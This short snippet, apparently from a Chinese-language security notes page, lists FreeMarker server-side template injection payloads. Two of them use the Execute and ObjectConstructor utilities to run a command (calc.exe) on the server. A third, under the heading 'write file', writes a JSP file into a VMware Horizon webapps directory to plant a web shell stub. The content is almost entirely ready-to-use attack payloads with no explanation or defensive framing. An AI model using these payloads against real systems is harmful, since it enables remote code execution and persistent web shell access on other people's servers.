```
<#assign value="freemarker.template.utility.Execute"?new()>${value("calc.exe")}

<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","calc.exe").start()}
```


写文件

```text
${"freemarker.template.utility.ObjectConstructor"?new()("java.io.FileOutputStream","/opt/vmware/horizon/workspace/webapps/SAAS/horizon/js/aaa.jsp").write("freemarker.template.utility.ObjectConstructor"?new()("java.lang.String","<% out.print(\"123\"); %>").getBytes())}
```